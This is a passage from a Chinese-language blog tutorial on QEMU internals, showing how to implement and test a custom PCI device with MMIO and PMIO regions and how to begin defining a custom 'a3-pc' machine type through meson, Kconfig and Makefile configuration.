&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br></code></pre></td></tr></table></figure><p>以及两个将父类转为子类的宏，因为 QOM 基本函数传递的大都是父类指针，所以我们需要一个宏来进行类型检查 + 转型，这也是 Qemu 中惯用的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br></code></pre></td></tr></table></figure><p>下面我们开始定义 MMIO 与 PMIO 的操作函数，这里笔者就简单地设置为读写设备内部的 buffer，并声明上两个 MemoryRegion 对应的函数表，需要注意的是这里传入的 <code>hwaddr</code> 类型参数其实为相对地址而非绝对地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br>    <span class="hljs-type">uint64_t</span> val = ~<span class="hljs-number">0LL</span>;<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> val;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> val;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;val, &amp;ds-&gt;buf[addr], size);<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> ;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> ;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;ds-&gt;buf[addr], &amp;val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后是设备实例的初始化函数，在 <code>PCIDeviceClass</code> 当中定义了一个名为 <code>realize</code> 的函数指针，当 PCI 设备被载入时便会调用这个函数指针指向的函数来初始化，所以这里我们也定义一个自己的初始化函数，不过我们需要做的工作其实基本上就只有初始化两个 <code>MemoryRegion</code>，<code>memory_region_init_io()</code> 会为这两个 <code>MemoryRegion</code> 进行初始化的工作，并设置函数表为我们指定的函数表，<code>pci_register_bar()</code> 则用来注册 BAR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是 Class 与 Object（也就是 instance）的初始化函数，这里需要注意的是在 Class 的初始化函数中我们应当设置父类 <code>PCIDeviceClass</code> 的一系列基本属性（也就是 PCI 设备的基本属性）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后就是为我们的 PCI 设备类型注册 TypeInfo 了，这里别忘了<strong>我们的接口中应当增加上 PCI 的接口</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><p>最后我们在 meson 构建系统中加入我们新增的这个设备，在 <code>hw/misc/meson.build</code> 中加入如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">softmmu_ss.add(when: &#x27;CONFIG_PCI_A3DEV&#x27;, if_true: files(&#x27;a3dev.c&#x27;))<br></code></pre></td></tr></table></figure><p>并在 <code>hw/misc/Kconfig</code> 中添加如下内容，这表示我们的设备会在 <code>CONFIG_PCI_DEVICES=y</code> 时编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config PCI_A3DEV<br>    bool<br>    default y if PCI_DEVICES<br>    depends on PCI<br></code></pre></td></tr></table></figure><p>之后编译 Qemu 并附加上 <code>-device a3dev-pci</code> ，之后随便起一个 Linux 系统，此时使用 <code>lspci</code> 指令我们便能看到我们新添加的 pci 设备：</p><p><img src="https://s2.loli.net/2022/07/28/Eu82rKgSlJBtbic.png" alt="image.png"></p><p>我们使用如下程序来测试我们的设备的输入输出，需要注意的是这需要 root 权限：</p><blockquote><p>PMIO，使用 iopl 更改端口权限后便能通过 in/out 类指令读写端口</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port_addr;<br><br>        <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no port provided!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no privilege!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        port_addr = atoi(argv[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] a3dev port addr start at: %d\n&quot;</span>, port_addr);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now writing into a3dev-pci...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                outl(i, port_addr + i * <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] writing done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] now reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%d--]&quot;</span>, port_addr + i * <span class="hljs-number">4</span>);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, inl(port_addr + i * <span class="hljs-number">4</span>));<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] reading done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>PMIO 测试成功，设备读写功能正常：</p><p><img src="https://s2.loli.net/2022/07/28/k4G1cOvNHwUtsjQ.png" alt="image.png"></p><blockquote><p>MMIO，使用 mmap 映射 <code>sys</code> 目录下设备的 <code>resource0</code> 文件即可直接读写</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> val)</span><br>&#123;<br>        *addr = val;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> *addr;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">uint32_t</span> *mmio_addr;<br>        <span class="hljs-type">int</span> dev_fd;<br><br>        dev_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,<br>                        O_RDWR | O_SYNC);<br>        <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to open mmio file! wrong path or no root!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        mmio_addr = (<span class="hljs-type">uint32_t</span>*)<br>                mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (mmio_addr == MAP_FAILED) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to mmap!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start writing to a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                mmio_write(mmio_addr + i, i);<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%p--]&quot;</span>, mmio_addr);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %u &quot;</span>, mmio_read(mmio_addr + i));<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] read done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>MMIO 测试成功，设备读写功能正常：</p><p><img src="https://s2.loli.net/2022/07/28/RCoHF7SWPIyD54j.png" alt="image.png"></p><h1>0x05.自定义 QEMU 机器类型（🕊）</h1><p>众所周知在 Qemu 当中有很多种不同的机器类型，其表示着包含一些默认设备（包含PCIe显卡、以太网控制器、SATA控制器等）的虚拟芯片组，例如 <code>pc</code> 对应于 Intel 的 <code>440FX</code> 芯片组（这也是 Qemu 默认选择的机器类型）</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>Qemu 主要支持两种大的 x86 芯片组：i440FX 和 Q35，后者相比前者而言的一个大的亮点便是增加了对 PCIe 的支持：</p><p><img src="https://s2.loli.net/2022/07/14/2xgwV7GeSskzWc4.png" alt="image.png"></p><p>我们可以使用 <code>-machine</code> 选项来指定我们要创建的虚拟机的机器类型，通过 <code>-machine ?</code> 选项可以查看当前支持的机器类型：</p><p><img src="https://s2.loli.net/2022/07/14/v6G5DV4SK7hCbRZ.png" alt="image.png"></p><p>但自带的机器类型通常往往无法满足我们多样化的要求，因此有的时候我们需要自行编写一种机器类型来满足我们的需求</p><h2 id="一、添加源码文件与编译选项">一、添加源码文件与编译选项</h2><p>在 Qemu 源码目录中，与具体支持的硬件相关的代码都放在 <code>hw/</code> 目录下，例如默认的 <code>PC</code> 架构便定义于 <code>hw/i386/pc.c</code>，因此若是我们想要定义一种新的机器类型则在该目录下进行定义是最好的</p><p>老版本的 Qemu 是纯粹基于 Makefile 进行构建的，而现在的新版本 Qemu 中则是使用 meson 进行项目构建，因此笔者接下来将会同时介绍两种配置方法</p><h3 id="I、新版本-Qemu-配置方式（meson）">I、新版本 Qemu 配置方式（meson）</h3><p>这里我们选择定义一种新的机器类型名为 <code>a3-pc</code>，并在 <code>hw/i386/a3-pc</code> 下创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree hw/i386/a3-pc/</span><br>hw/i386/a3-pc/<br>├── accel.c<br>├── machine.c<br>└── meson.build<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>三个文件说明如下：</p><ul><li><code>meson.build</code>：meson 项目构建文件</li><li><code>machine.c</code>：机器的主体代码</li><li><code>accel.c</code>：自定义的 accelerator 代码</li></ul><p>在 <code>meson.build</code> 中写入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3pc_ss = ss.source_set()<br>a3pc_ss.add(files(&#x27;accel.c&#x27;))<br>a3pc_ss.add(files(&#x27;machine.c&#x27;))<br><br>i386_ss.add_all(when: &#x27;CONFIG_A3_PC&#x27;, if_true: a3pc_ss)<br></code></pre></td></tr></table></figure><p>之后在 <code>hw/i386/meson.build</code> 中添加该语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">subdir(&#x27;a3-pc&#x27;)<br></code></pre></td></tr></table></figure><p>这里笔者选择创建一个 i386 类型的机器，因此我们还需要修改 <code>hw/i386/Kconfig</code>，添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>在 <code>configs/devices/i386-softmmu/default.mak</code> 末尾添加如下内容，使得我们的新的机器类型会被默认编译进去：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_A3_PC=y<br></code></pre></td></tr></table></figure><h3 id="II、老版本-Qemu-配置方式（makefile）">II、老版本 Qemu 配置方式（makefile）</h3><p>如果是版本稍微老一点的 Qemu 则应当在 <code>hw/a3-pc</code> 下创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree ./hw/a3-pc/</span><br>./hw/a3-pc/<br>├── accel.c<br>├── machine.c<br>└── Makefile.objs<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>三个文件说明如下：</p><ul><li><code>Makefile.objs</code>：机器的 Makefile 文件</li><li><code>machine.c</code>：机器的主体代码</li><li><code>accel.c</code>：自定义的 accelerator 代码，也可以直接用默认的 TCG accelerator</li></ul><p>并在 <code>Makefile.objs</code> 中添加如下内容：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += accel.o<br>obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += machine.o<br></code></pre></td></tr></table></figure><p>之后在 <code>hw/Makefile.objs</code> 中添加上该配置：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">devices-dirs-y = core/<br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(CONFIG_SOFTMMU)</span>, y)<br><span class="hljs-comment"># ...</span><br>devices-dirs-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += a3-pc/<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p>这里我们通过添加一个新的选项 <code>CONFIG_A3_PC</code> 来控制是否要进行该类型机器的编译</p><p>笔者选择创建一个 i386 类型的机器，因此我们还需要修改 <code>hw/i386/Kconfig</code>，添加如下内容，表示一个空白的机器，后面我们若是需要添加硬件则还需要在这部分进行改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>最后我们在源码根目录的 <code>configure</code> 文件中添加如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">supported_a3_pc_target</span></span>() &#123;<br>    <span 